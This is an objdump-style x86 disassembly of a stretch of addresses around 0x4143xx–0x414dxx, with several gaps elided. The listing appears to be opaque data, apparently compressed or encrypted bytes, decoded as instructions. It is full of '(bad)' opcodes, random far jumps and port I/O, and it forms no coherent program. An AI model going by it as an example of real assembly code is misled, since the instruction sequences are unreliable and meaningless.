  41439b:	scas   al,BYTE PTR es:[edi]
  41439c:	mov    WORD PTR [ebp-0xe],es
  41439f:	adc    DWORD PTR [esi+0x6940c7],edx
  4143a5:	push   esp
  4143a6:	inc    esi
  4143a7:	ret    0x9b42
  4143aa:	fwait
  4143ab:	pop    ebp
  4143ac:	ficom  WORD PTR [edx-0x57e2c126]
  4143b2:	xor    cl,BYTE PTR [edx+0x7e]
  4143b5:	mov    ah,0xa8
  4143b7:	aas    
  4143b8:	rcl    dl,cl
  4143ba:	fdivr  QWORD PTR [edx+esi*4+0x78]
  4143be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143bf:	fidivr DWORD PTR [ecx]
  4143c1:	jno    0x4143d2
  4143c3:	fnstcw WORD PTR gs:[ecx+0x17]
  4143c7:	xchg   edx,eax
  4143c8:	mov    eax,ds:0xf5ec10e
  4143cd:	cmp    ebx,ecx
  4143cf:	outs   dx,DWORD PTR ds:[esi]
  4143d0:	pusha  
  4143d1:	and    ah,BYTE PTR [edx-0xe]
  4143d4:	or     BYTE PTR [ecx],cl
  4143d6:	xlat   BYTE PTR ds:[ebx]
  4143d7:	inc    BYTE PTR [esi-0x278ebf7b]
  4143dd:	mov    dl,0xe6
  4143df:	cwde   
  4143e0:	aas    
  4143e1:	nop
  4143e2:	inc    edi
  4143e3:	ja     0x41436a
  4143e5:	in     eax,0x9f
  4143e7:	jbe    0x41443e
  4143e9:	adc    eax,0x67d68163
  4143ee:	cmp    ah,BYTE PTR [ebx+0x70]
  4143f1:	and    al,0x9b
  4143f3:	mov    WORD PTR [esi-0x162ac8c7],?
  4143f9:	repnz push es
  4143fb:	fistp  WORD PTR [esi]
  4143fd:	cmp    eax,0x54e7790c
  414402:	dec    edi
  414403:	cmp    DWORD PTR [eax+0x19a6d3c9],0x4bbc1db3
  41440d:	cld    
  41440e:	xor    BYTE PTR [edi],ah
  414410:	mov    ebx,0x1e79a5cd
  414415:	xchg   ah,bh
  414417:	mov    ecx,DWORD PTR ds:0xd2ce420f
  41441d:	and    esi,DWORD PTR [edx-0x5351c654]
  414423:	repnz jmp 0x4e8c:0x2c697ef8
  41442b:	mov    al,ah
  41442d:	add    DWORD PTR [edx],edi
  41442f:	jmp    0xff:0xcc873507
	...
  414496:	pop    ebx
  414497:	jae    0x4144db
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	mov    ecx,0x9bd2415
  4144a7:	rol    DWORD PTR [eax],cl
  4144a9:	add    BYTE PTR [edi],al
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    BYTE PTR ds:0x5c06f501,dh
  4144b3:	xchg   edx,eax
  4144b4:	rol    DWORD PTR [edi],1
  4144b6:	mov    ebx,0x7efa0498
  4144bb:	lock dec eax
  4144bd:	xor    BYTE PTR [ecx],dh
  4144bf:	cdq    
  4144c0:	mov    ebx,0x4805f39d
  4144c5:	push   es
  4144c6:	fistp  QWORD PTR [esi+0x52732cf5]
  4144cc:	inc    edx
  4144cd:	out    0x70,al
  4144cf:	out    0x62,al
  4144d1:	adc    BYTE PTR [edi+0x1b],bl
  4144d4:	scas   al,BYTE PTR es:[edi]
  4144d5:	mov    ds:0x9825e408,eax
  4144da:	stos   DWORD PTR es:[edi],eax
  4144db:	mov    al,0x88
  4144dd:	push   esi
  4144de:	pop    esi
  4144df:	cmp    eax,0xb0986b0e
  4144e4:	aad    0xde
  4144e6:	out    dx,eax
  4144e7:	cmp    al,0x21
  4144e9:	stos   DWORD PTR es:[edi],eax
  4144ea:	push   edi
  4144eb:	in     eax,0x9b
  4144ed:	inc    eax
  4144ee:	pop    ds
  4144ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f0:	cmp    BYTE PTR [ecx-0x27],ch
  4144f3:	dec    ebx
  4144f4:	repz sub dh,BYTE PTR [esi-0x33]
  4144f8:	dec    esi
  4144f9:	cmc    
  4144fa:	scas   al,BYTE PTR es:[edi]
  4144fb:	xor    BYTE PTR [edi*4-0x60e15660],0x6
  414503:	sub    eax,0x4ef6fdd4
  414508:	inc    ebp
  414509:	mov    edx,0x6f780172
  41450e:	iret   
  41450f:	int3   
  414510:	dec    ecx
  414511:	arpl   WORD PTR [ecx+0x43],di
  414514:	js     0x4144e3
  414516:	ret    0xda6
  414519:	sbb    esp,eax
  41451b:	fnstcw WORD PTR [edx-0x7f]
  41451e:	sub    DWORD PTR [edx-0x2add38e0],edi
  414524:	mov    cl,0x55
  414526:	xor    ch,bh
  414528:	cmp    DWORD PTR [esi-0x1e],eax
  41452b:	xor    ebp,DWORD PTR [ecx]
  41452d:	xor    edi,0x815c9c2b
  414533:	or     al,0x1b
  414535:	jmp    0x3bc2:0x335be90e
  41453c:	mov    ch,0xa9
  41453e:	xchg   edi,eax
  41453f:	fwait
  414540:	aaa    
  414541:	mov    ds:0xb4ff7056,eax
  414546:	dec    eax
  414547:	sbb    eax,0xadb49359
  41454c:	dec    ebx
  41454d:	sub    al,bh
  41454f:	and    edi,edx
  414551:	lods   al,BYTE PTR ds:[esi]
  414552:	scas   al,BYTE PTR es:[edi]
  414553:	push   cs
  414554:	or     eax,0x1bf5a0b2
  414559:	dec    esp
  41455a:	jmp    0x823f:0xaac7e881
  414561:	cmc    
  414562:	jge    0x4145b6
  414564:	xchg   ecx,eax
  414565:	ror    eax,cl
  414567:	jecxz  0x4145be
  414569:	std    
  41456a:	ds into 
  41456c:	mov    bh,0x79
  41456e:	(bad)  
  41456f:	cmp    al,0xad
  414571:	adc    al,0x7d
  414573:	lds    esi,FWORD PTR es:[edi]
  414576:	pop    edx
  414577:	pop    edi
  414578:	or     esp,edx
  41457a:	in     al,dx
  41457b:	fwait
  41457c:	sbb    al,0x61
  41457e:	lods   eax,DWORD PTR ds:[esi]
  41457f:	popaw  
  414581:	adc    DWORD PTR [edi-0x36],esp
  414584:	cmc    
  414585:	pop    ss
  414586:	sub    eax,0x8737ec9c
  41458b:	sbb    BYTE PTR [eax+0x16aefbef],bl
  414591:	out    dx,al
  414592:	test   eax,0xd2e193cc
  414597:	nop
  414598:	cmp    BYTE PTR [edx-0x14],dh
  41459b:	nop
  41459c:	mov    WORD PTR [edx+eax*2+0x3240f1a6],?
  4145a3:	push   cs
  4145a4:	cmp    eax,0x99f442ea
  4145a9:	and    cl,al
  4145ab:	mov    ch,0xc8
  4145ad:	(bad)  
  4145af:	test   BYTE PTR [ebp-0x54047fb6],ch
	...
  414615:	add    BYTE PTR [edi+0x5e],bh
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0xa26a0dc2
  414624:	std    
  414625:	imul   edx,DWORD PTR [eax],0xffffffd4
  414628:	add    BYTE PTR [eax],al
  41462a:	pop    es
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    dh,dl
  41462f:	ret    0x99b8
  414632:	pop    ebp
  414633:	out    dx,eax
  414634:	sbb    eax,0x96142bfc
  414639:	cmp    bh,BYTE PTR [ebx-0x5a]
  41463c:	dec    eax
  41463d:	call   0x9e92:0x6d23dc8e
  414644:	inc    esi
  414645:	frstor [edi+0x78]
  414648:	das    
  414649:	and    BYTE PTR [ecx+ebx*4+0x47],cl
  41464d:	sub    al,0xb3
  41464f:	pusha  
  414650:	sahf   
  414651:	push   ss
  414652:	jmp    0x41462f
  414654:	fcmovb st,st(0)
  414656:	add    eax,0xccd75c46
  41465b:	xchg   esp,eax
  41465c:	push   es
  41465d:	dec    ecx
  41465e:	xor    eax,0xb3853f04
  414663:	mov    edx,0x403b4b25
  414668:	sbb    BYTE PTR [ebx+eiz*1-0x3c6cbef7],cl
  41466f:	ins    BYTE PTR es:[edi],dx
  414670:	into   
  414671:	or     ah,BYTE PTR ds:0x612727d7
  414677:	dec    ecx
  414678:	xchg   BYTE PTR [esi-0xf],dh
  41467b:	ss adc eax,0xe1fd4268
  414681:	mov    WORD PTR [edx+0x40],es
  414684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414685:	(bad)  
  414686:	mov    esp,0xabad3229
  41468b:	push   esp
  41468c:	sub    cx,WORD PTR [ebx+0x17]
  414690:	jecxz  0x4146d7
  414692:	popw   es
  414694:	inc    ebp
  414695:	cmp    BYTE PTR ds:0x4b3efc1d,cl
  41469b:	(bad)  
  41469c:	inc    DWORD PTR [eax]
  41469e:	or     al,0x64
  4146a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a1:	and    bl,BYTE PTR [ecx-0x38d29154]
  4146a7:	jne    0x4146e2
  4146a9:	mov    ch,0xf8
  4146ab:	pop    ds
  4146ac:	push   eax
  4146ad:	pop    ebx
  4146ae:	xor    esi,edx
  4146b0:	adc    eax,0xeaa175ba
  4146b5:	mov    esp,0x518aadea
  4146ba:	and    eax,0x8e97fef8
  4146bf:	clc    
  4146c0:	add    esi,DWORD PTR [ebx-0x17]
  4146c3:	cdq    
  4146c4:	jae    0x414667
  4146c6:	lods   al,BYTE PTR ds:[esi]
  4146c7:	push   edi
  4146c8:	fisubr WORD PTR [edi-0x7161981b]
  4146ce:	xchg   edi,eax
  4146cf:	popf   
  4146d0:	pop    edx
  4146d1:	inc    ebx
  4146d2:	add    eax,0x44af93a6
  4146d7:	jno    0x4146cf
  4146d9:	(bad)
  4146dd:	mov    dh,0xcb
  4146df:	push   esp
  4146e0:	cwde   
  4146e1:	mov    ebx,0x8a2003e0
  4146e6:	inc    eax
  4146e7:	popa   
  4146e8:	inc    ebx
  4146e9:	(bad)  
  4146ea:	retf   0xe3a9
  4146ed:	loope  0x41475d
  4146ef:	add    BYTE PTR [ecx+0x79ffffa9],ch
  4146f5:	mov    dh,0x4
  4146f7:	adc    eax,0x5cfc4f00
  4146fc:	fucom  st(1)
  4146fe:	pop    esp
  4146ff:	add    eax,0xc13b25c
  414704:	jg     0x414687
  414706:	mov    esi,0x1cabc44e
  41470b:	add    DWORD PTR [ebx-0x3f5366bf],ebp
  414711:	cmp    eax,DWORD PTR [esi]
  414713:	popa   
  414714:	jecxz  0x41474b
  414716:	int3   
  414717:	sub    dh,ah
  414719:	xchg   esi,eax
  41471a:	pop    esi
  41471b:	add    esi,ecx
  41471d:	jmp    0xa7290f96
  414722:	loopne 0x4146f1
  414724:	mov    es,WORD PTR [edx+0x3e]
  414727:	mov    al,ds:0xa9e065eb
  41472c:	adc    DWORD PTR [ecx],esi
  41472e:	and    eax,0xb1432b14
  414733:	dec    esp
  414734:	pop    DWORD PTR [eax]
	...
  414796:	jle    0x4147c7
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	sub    al,0x43
  4147a4:	daa    
  4147a5:	pop    ebp
  4147a6:	pop    ss
  4147a7:	aad    0x0
  4147a9:	add    BYTE PTR [edi],al
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [esi],dl
  4147af:	in     al,0x7b
  4147b1:	pop    ss
  4147b2:	call   0x5da8:0x9639bfc
  4147b9:	pop    esi
  4147ba:	lods   eax,DWORD PTR ds:[esi]
  4147bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147bc:	stc    
  4147bd:	lods   eax,DWORD PTR ds:[esi]
  4147be:	jmp    0xda221a91
  4147c3:	fs cmp eax,0xfd3ee076
  4147c9:	sbb    dl,BYTE PTR [ebp+0x5b]
  4147cc:	cmp    al,0x58
  4147ce:	or     al,dl
  4147d0:	mov    esp,es
  4147d2:	lock fst QWORD PTR [edi-0xc1e7ae3]
  4147d9:	sti    
  4147da:	fdivr  st(7),st
  4147dc:	dec    eax
  4147dd:	xor    al,0xa
  4147df:	aam    0x6b
  4147e1:	popa   
  4147e2:	rcl    BYTE PTR [edi],1
  4147e4:	psubd  mm1,QWORD PTR [edi-0x662c020b]
  4147eb:	push   esp
  4147ec:	out    dx,eax
  4147ed:	add    al,0xe8
  4147ef:	cli    
  4147f0:	leave  
  4147f1:	arpl   WORD PTR [edi],si
  4147f3:	call   0xf2e5:0xaf0fc4e8
  4147fa:	test   DWORD PTR ds:0xa11d5351,0x22f29dd0
  414804:	je     0x4147e7
  414806:	stos   DWORD PTR es:[edi],eax
  414807:	shr    al,cl
  414809:	jl     0x4147ce
  41480b:	std    
  41480c:	cmp    bh,dl
  41480e:	pop    ecx
  41480f:	call   0x206824b2
  414814:	cmp    al,bl
  414816:	out    dx,eax
  414817:	mov    bl,0x42
  414819:	xor    esp,DWORD PTR [esi-0x4b0aff6c]
  41481f:	xchg   ecx,eax
  414820:	xchg   edx,eax
  414821:	aas    
  414822:	xchg   ebx,eax
  414823:	pop    ebp
  414824:	aad    0x89
  414826:	int    0xda
  414828:	stc    
  414829:	cmp    al,0xa7
  41482b:	sbb    al,0x30
  41482d:	ret    0xf32e
  414830:	inc    ecx
  414831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414832:	aas    
  414833:	in     al,0xb5
  414835:	and    cl,0xae
  414838:	retf   0x9cd8
  41483b:	(bad)  
  41483c:	cmp    al,0x3a
  41483e:	std    
  41483f:	xchg   ebp,eax
  414840:	mov    al,0x9b
  414842:	iret   
  414843:	sbb    BYTE PTR [esi-0x55],al
  414846:	push   0xdbbcce48
  41484b:	out    dx,al
  41484c:	push   esi
  41484d:	mov    dl,0x1b
  41484f:	pop    edx
  414850:	lods   eax,DWORD PTR ds:[esi]
  414851:	fs dec esp
  414853:	add    ch,BYTE PTR [esi+ebx*8+0x1b]
  414857:	jp     0x41489e
  414859:	repnz add BYTE PTR [eax-0x70],dl
  41485d:	and    al,0xfa
  41485f:	and    esp,DWORD PTR [edx]
  414861:	fadd   QWORD PTR [ecx]
  414863:	push   cs
  414864:	push   edx
  414865:	stos   BYTE PTR es:[edi],al
  414866:	mov    edi,0x15d35273
  41486b:	add    bl,BYTE PTR [eax]
  41486d:	adc    ebx,DWORD PTR [esp+edi*4]
  414870:	pshufw mm6,QWORD PTR [eax-0x7d10b8a2],0x5a
  414878:	cmp    ecx,ebp
  41487a:	icebp  
  41487b:	push   es
  41487c:	push   esp
  41487d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41487e:	sub    bh,BYTE PTR [eax]
  414880:	and    edx,DWORD PTR [eax]
  414882:	lods   al,BYTE PTR ds:[esi]
  414883:	jnp    0x4148ed
  414885:	ret    0x8aea
  414888:	enter  0x7a44,0x41
  41488c:	xchg   DWORD PTR [ecx+0x28],esp
  41488f:	mov    cl,0x7a
  414891:	mov    ch,0x5d
  414893:	sub    bl,BYTE PTR [ecx]
  414895:	jne    0x414865
  414897:	mov    edx,0x5674431c
  41489c:	fcom   QWORD PTR [ebp-0x6e3d1480]
  4148a2:	dec    edx
  4148a3:	pop    edx
  4148a4:	or     al,al
  4148a6:	shl    dh,cl
  4148a8:	out    dx,al
  4148a9:	fs icebp 
  4148ab:	ss das 
  4148ad:	sub    al,0x6c
  4148af:	add    edx,DWORD PTR [ebx-0x7096e7d7]
	...
  414915:	add    BYTE PTR [ebx],cl
  414917:	jle    0x4148eb
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0x2804c1ed
  414924:	imul   edi,eax,0xd61e
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [edi],dh
  41492f:	and    esp,DWORD PTR [esi+0x23]
  414932:	mov    WORD PTR [esi+0x51fd2742],ds
  414938:	fisttp DWORD PTR [esi]
  41493a:	test   al,0xde
  41493c:	mov    dl,0x31
  41493e:	or     DWORD PTR [edx],eax
  414940:	mov    ?,edx
  414942:	out    dx,eax
  414943:	(bad)  
  414945:	push   0xf8b05cad
  41494a:	jae    0x4149bf
  41494c:	bnd jbe 0x41492b
  41494f:	push   0x5db7ddac
  414954:	lea    edi,[eax-0x51]
  414957:	cmp    esp,DWORD PTR [eax+0x7ffb3886]
  41495d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41495e:	xchg   ecx,eax
  41495f:	ret    
  414960:	or     DWORD PTR [eax+0x78],edi
  414963:	add    ebx,DWORD PTR [esi-0x3b]
  414966:	fild   DWORD PTR [ebp-0x7f]
  414969:	mov    ecx,DWORD PTR [ebx+0x28489138]
  41496f:	pop    es
  414970:	clc    
  414971:	and    dh,0xf1
  414974:	cmp    DWORD PTR [ebx+ebp*8-0x37369726],0xd19799ab
  41497f:	push   esp
  414980:	mov    edi,0x266859f9
  414985:	mov    ss,WORD PTR [ecx]
  414987:	dec    edx
  414988:	repnz inc ebp
  41498a:	retf   
  41498b:	(bad)  
  41498d:	fs into 
  41498f:	push   ebp
  414990:	add    DWORD PTR [ecx+esi*4+0x52],eax
  414994:	pop    es
  414995:	imul   esi,DWORD PTR [ebx-0x6b],0x7f
  414999:	pop    eax
  41499a:	scas   al,BYTE PTR es:[edi]
  41499b:	push   es
  41499c:	push   eax
  41499d:	adc    BYTE PTR [edx+eax*8],0xaf
  4149a1:	push   ecx
  4149a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a3:	adc    eax,DWORD PTR [esi+ecx*2]
  4149a6:	into   
  4149a7:	inc    esp
  4149a8:	pop    ss
  4149a9:	das    
  4149aa:	jno    0x41498e
  4149ac:	and    al,0x95
  4149ae:	mov    ah,0x55
  4149b0:	frstor [esi-0x26]
  4149b3:	mov    ecx,0xbfb9e7b2
  4149b8:	mov    esp,0xbbf9749a
  4149bd:	xor    DWORD PTR [ecx+0x6b1a2294],0xa3568ad3
  4149c7:	mov    ds:0x39a37d51,eax
  4149cc:	daa    
  4149cd:	or     eax,0x3e83b3d4
  4149d2:	(bad)  
  4149d3:	(bad)  
  4149d4:	jecxz  0x4149d6
  4149d6:	cli    
  4149d7:	jmp    0x377f:0x67dd994f
  4149de:	pop    eax
  4149df:	lahf   
  4149e0:	pop    es
  4149e1:	out    0xe0,al
  4149e3:	mov    al,ds:0x93e22d8f
  4149e8:	or     dh,bl
  4149ea:	std    
  4149eb:	rcl    BYTE PTR [eax-0x2a],cl
  4149ee:	adc    DWORD PTR [edx-0x33692ff5],0xdd7c877a
  4149f8:	sbb    BYTE PTR [ebp-0x69],al
  4149fb:	jbe    0x414a54
  4149fd:	xchg   al,al
  4149ff:	sbb    al,0x54
  414a01:	and    eax,0x21cdef09
  414a06:	sti    
  414a07:	in     al,0xfb
  414a09:	add    al,0x78
  414a0b:	pop    ecx
  414a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0d:	mov    eax,ss:0x42ed72fa
  414a13:	fwait
  414a14:	in     al,dx
  414a15:	jg     0x414a6c
  414a17:	jne    0x4149b3
  414a19:	jo     0x414a81
  414a1b:	or     eax,0xd2b49b01
  414a20:	xchg   esp,eax
  414a21:	scas   al,BYTE PTR es:[edi]
  414a22:	int    0xc9
  414a24:	mov    eax,0xccbe37a5
  414a29:	mov    es,WORD PTR [ebx+0x3b4520bc]
  414a2f:	add    al,0x1e
  414a31:	dec    edx
  414a32:	sub    ch,BYTE PTR [ebx]
  414a34:	add    BYTE PTR fs:[eax],al
	...
  414a93:	add    BYTE PTR [eax],al
  414a95:	add    BYTE PTR [edi+0x7e363ed9],bl
  414a9b:	neg    DWORD PTR [edi-0x4d9bdb07]
  414aa1:	sbb    ebx,DWORD PTR [eax+0xb]
  414aa4:	adc    eax,esi
  414aa6:	and    eax,0x70000d7
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [ebx+eiz*2-0x4eba2a91],al
  414ab4:	pop    edi
  414ab5:	pop    ebp
  414ab6:	popa   
  414ab7:	adc    esi,0xf6dfeced
  414abd:	gs in  al,dx
  414abf:	push   eax
  414ac0:	mov    dl,0xf5
  414ac2:	mov    edi,0x65629d50
  414ac7:	scas   eax,DWORD PTR es:[edi]
  414ac8:	out    0xe3,al
  414aca:	xchg   edi,eax
  414acb:	adc    ecx,ecx
  414acd:	inc    eax
  414ace:	inc    ebx
  414acf:	xor    dh,dl
  414ad1:	mov    WORD PTR [ebp-0x6a797ee],fs
  414ad7:	das    
  414ad8:	(bad)  
  414ada:	inc    esp
  414adb:	push   esp
  414adc:	cmp    eax,0x937016ec
  414ae1:	mov    ds:0x665d23ca,eax
  414ae6:	mov    BYTE PTR [edi-0x3ab84910],bl
  414aec:	mov    ch,0xe2
  414aee:	mov    dh,ch
  414af0:	bsr    esi,DWORD PTR [eax-0x23ad7e86]
  414af7:	xchg   ebx,eax
  414af8:	imul   ebp,DWORD PTR [ebp+0x1267c54],0x42
  414aff:	mov    dh,0xc9
  414b01:	and    dl,dh
  414b03:	fdiv   st,st(5)
  414b05:	idiv   BYTE PTR [ebx]
  414b07:	shr    BYTE PTR [eax],cl
  414b09:	out    0xd1,eax
  414b0b:	mov    ds:0xc28d3063,al
  414b10:	mov    dl,0x1b
  414b12:	ror    BYTE PTR [esi-0x609df960],0xec
  414b19:	mov    ecx,0xbd952262
  414b1e:	scas   al,BYTE PTR es:[edi]
  414b1f:	(bad)  
  414b20:	xor    DWORD PTR [ecx+0x5b],esi
  414b23:	push   edx
  414b24:	cmp    dh,ch
  414b26:	push   edi
  414b27:	out    0xe,eax
  414b29:	retf   0x6464
  414b2c:	lock (bad) 
  414b2e:	mov    edi,0xca105465
  414b33:	pop    es
  414b34:	push   edx
  414b35:	in     eax,0xbc
  414b37:	xchg   ebp,eax
  414b38:	retf   
  414b39:	add    DWORD PTR [edx+0x4cd4953],esi
  414b3f:	add    bh,BYTE PTR [edi-0xb]
  414b42:	ret    
  414b43:	test   al,0xf5
  414b45:	sti    
  414b46:	addr16 pop esp
  414b48:	jp     0x414b87
  414b4a:	cmp    esi,ecx
  414b4c:	sub    al,0xb9
  414b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b4f:	ss mov edi,0x597abec6
  414b55:	sbb    DWORD PTR [esi],ecx
  414b57:	(bad)  
  414b58:	in     al,0xc
  414b5a:	lds    edx,FWORD PTR [ebx]
  414b5c:	out    0xe0,al
  414b5e:	aad    0x5b
  414b60:	pop    ecx
  414b61:	xchg   ebx,eax
  414b62:	pusha  
  414b63:	test   dh,bh
  414b65:	jo     0x414b37
  414b67:	repz sar DWORD PTR [esi+eiz*1],cl
  414b6b:	mov    ebp,0xb5cf5bb3
  414b70:	in     al,dx
  414b71:	xchg   edi,eax
  414b72:	cld    
  414b73:	pop    esi
  414b74:	and    eax,0x20b18db3
  414b79:	scas   eax,DWORD PTR es:[edi]
  414b7a:	icebp  
  414b7b:	sub    BYTE PTR [edx+0x480b49d9],al
  414b81:	inc    ebx
  414b82:	call   0xfce7884a
  414b87:	push   cs
  414b88:	or     al,0x9c
  414b8a:	and    edx,edi
  414b8c:	dec    ecx
  414b8d:	push   0xa78280ef
  414b92:	ret    
  414b93:	and    bl,BYTE PTR [ebx+ecx*2+0x13cfa08c]
  414b9a:	out    dx,al
  414b9b:	ins    DWORD PTR es:[edi],dx
  414b9c:	xchg   ebp,eax
  414b9d:	and    ah,BYTE PTR [eax+ebx*8+0x1c]
  414ba1:	retf   0x6601
  414ba4:	(bad)  
  414ba6:	add    DWORD PTR [eax],ebp
  414ba8:	pop    esp
  414ba9:	popa   
  414baa:	or     BYTE PTR [edi],bh
  414bac:	(bad)  
  414bad:	out    0x16,eax
  414baf:	pop    eax
  414bb0:	inc    ecx
  414bb1:	popf   
  414bb2:	pop    ecx
  414bb3:	stos   BYTE PTR es:[edi],al
  414bb4:	out    dx,al
	...
  414c15:	add    BYTE PTR [esp+eiz*2],dh
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	sub    dh,BYTE PTR [esi]
  414c24:	icebp  
  414c25:	pop    ds
  414c26:	sub    al,0xd8
  414c28:	add    BYTE PTR [eax],al
  414c2a:	pop    es
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    BYTE PTR [esp+ecx*4+0x7d36204d],bl
  414c34:	inc    edi
  414c35:	mov    al,0xf
  414c37:	cmp    cl,BYTE PTR [edx-0x688aad5f]
  414c3d:	xchg   ebp,eax
  414c3e:	(bad)  
  414c3f:	out    dx,eax
  414c40:	xor    DWORD PTR [esi-0x6b],eax
  414c43:	loop   0x414c4d
  414c45:	xor    DWORD PTR [edi-0x58],esp
  414c48:	(bad)  
  414c49:	push   cs
  414c4a:	add    ecx,ecx
  414c4c:	frstor [edx+0xab8e848]
  414c52:	xchg   BYTE PTR [edi+0x5],dl
  414c55:	and    al,BYTE PTR [edx+ecx*8-0x55]
  414c59:	neg    BYTE PTR gs:[ebx+0x7d4536a6]
  414c60:	push   ebp
  414c61:	jb     0x414cb2
  414c63:	rcl    BYTE PTR ds:0xf26762d8,1
  414c69:	xchg   ebx,eax
  414c6a:	call   0x5e40b12a
  414c6f:	lea    ecx,[edi+0x78]
  414c72:	or     BYTE PTR [eax+0x68],bh
  414c75:	mov    edi,0xf65c55ef
  414c7a:	pusha  
  414c7b:	xchg   esp,eax
  414c7c:	loop   0x414c81
  414c7e:	and    BYTE PTR [ecx],dh
  414c80:	xchg   DWORD PTR ds:0x98cf9881,esp
  414c86:	pusha  
  414c87:	imul   edx,DWORD PTR gs:[edx-0x73],0x24
  414c8c:	adc    DWORD PTR [esi],esp
  414c8e:	mov    ebx,0x78e50b4b
  414c93:	pushf  
  414c94:	xor    DWORD PTR [ebx-0x5e],esp
  414c97:	fisubr WORD PTR [edi-0x4c]
  414c9a:	outs   dx,DWORD PTR ds:[esi]
  414c9b:	mov    ds:0x42dace6f,al
  414ca0:	pushf  
  414ca1:	jge    0x414c3f
  414ca3:	xchg   esi,eax
  414ca4:	loop   0x414cdb
  414ca6:	mov    ebp,esi
  414ca8:	ret    
  414ca9:	es ret 0xeea6
  414cad:	jns    0x414ca4
  414caf:	and    dh,dh
  414cb1:	or     al,0x8a
  414cb3:	icebp  
  414cb4:	bound  edi,QWORD PTR [eax-0x39]
  414cb7:	outs   dx,DWORD PTR ds:[esi]
  414cb8:	adc    BYTE PTR [ebp+eiz*2+0x3d676f0e],0xaa
  414cc0:	push   ecx
  414cc1:	out    0x39,eax
  414cc3:	and    eax,0xd10863a2
  414cc8:	js     0x414c7c
  414cca:	pop    ds
  414ccb:	add    DWORD PTR [edi-0x7a],esi
  414cce:	push   edi
  414ccf:	daa    
  414cd0:	icebp  
  414cd1:	inc    eax
  414cd2:	sub    BYTE PTR [edi],ch
  414cd4:	xor    ch,ah
  414cd6:	arpl   WORD PTR [edx+0x77ae8f5d],cx
  414cdc:	jne    0x414d03
  414cde:	xor    eax,0x7dc98fc8
  414ce3:	shl    BYTE PTR ds:0xdcaa40df,cl
  414ce9:	cmp    ch,dh
  414ceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cec:	xchg   BYTE PTR [ebx-0x46],bh
  414cef:	and    cl,bh
  414cf1:	xor    edi,esi
  414cf3:	mov    eax,ds:0xf849b285
  414cf8:	xlat   BYTE PTR ds:[ebx]
  414cf9:	xchg   dh,dh
  414cfb:	mov    esi,0x180aaa5b
  414d00:	rcr    BYTE PTR [ebx+esi*8-0x1e37eae6],cl
  414d07:	push   ebp
  414d08:	dec    edx
  414d09:	lods   eax,DWORD PTR ds:[esi]
  414d0a:	add    edi,DWORD PTR [ecx]
  414d0c:	popa   
  414d0d:	mov    ?,WORD PTR [eax]
  414d0f:	aad    0x8c
  414d11:	xchg   ecx,eax
  414d12:	push   ecx
  414d13:	loop   0x414d53
  414d15:	cmp    BYTE PTR [ebx],bl
  414d17:	mov    al,ds:0xc50c7073
  414d1c:	and    dh,dl
  414d1e:	daa    
  414d1f:	sbb    al,0x90
  414d21:	add    eax,0x6162fb81
  414d26:	jno    0x414d7b
  414d28:	pop    edx
  414d29:	xchg   ebp,eax
  414d2a:	aas    
  414d2b:	xor    BYTE PTR [edi+0x96f0643],ch
  414d31:	ja     0x414cd9
  414d33:	fst    QWORD PTR [ebp+0x0]
	...
  414d95:	add    BYTE PTR [edi+0x3e911299],dh
  414d9b:	fwait
  414d9c:	mov    bh,0xbf
  414d9e:	sbb    DWORD PTR [esi-0x5f9aebbb],ebp
  414da4:	cmp    eax,0xd9338c
  414da9:	add    BYTE PTR [edi],al
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    BYTE PTR [esi+ebx*4],ah
  414db0:	cmp    bl,BYTE PTR [edx-0x5ffdd46b]
  414db6:	bound  ebp,QWORD PTR [ebp+0x58]
  414db9:	outs   dx,BYTE PTR ds:[esi]
  414dba:	sub    al,0x91
  414dbc:	mov    ds,WORD PTR [esi+esi*4+0x2]
  414dc0:	into   
  414dc1:	pop    ss
  414dc2:	adc    DWORD PTR [edi+0x54174c84],0x79
  414dc9:	outs   dx,BYTE PTR ds:[esi]
  414dca:	add    BYTE PTR [edi-0x32f01029],dh
  414dd0:	pop    eax
  414dd1:	(bad)  
  414dd2:	ficom  DWORD PTR [eax-0xd]
  414dd6:	mov    DWORD PTR [esi-0x70fc013a],ebx
  414ddc:	jmp    0xd6f:0xd4fa4f86
  414de3:	xchg   esp,eax
  414de4:	pop    edi
  414de5:	adc    ch,BYTE PTR [ebp+0x69b62f0a]
  414deb:	pop    ebx
  414dec:	in     eax,dx
  414ded:	ret    0x169d
  414df0:	(bad)  
